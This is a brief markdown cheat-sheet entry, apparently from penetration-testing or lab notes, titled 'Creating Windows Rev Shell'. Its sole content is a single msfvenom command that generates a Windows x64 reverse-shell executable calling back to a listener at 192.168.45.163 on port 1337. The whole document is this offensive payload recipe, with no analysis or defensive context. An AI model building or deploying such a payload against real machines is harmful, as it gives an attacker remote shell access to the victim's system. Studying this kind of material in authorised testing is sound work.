# Creating Windows Rev Shell

## PoC

```
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.163 LPORT=1337
```

